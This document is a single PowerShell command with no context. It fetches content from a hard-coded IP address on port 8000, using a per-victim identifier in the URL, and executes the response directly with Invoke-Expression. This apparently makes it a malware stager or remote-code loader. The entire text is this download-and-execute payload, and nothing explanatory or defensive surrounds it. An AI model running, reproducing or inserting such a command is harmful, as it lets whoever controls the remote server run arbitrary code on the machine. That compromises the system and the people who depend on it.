$uri ="http://185.205.187.109:8000/{UID}";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop; Invoke-Expression $response.Content
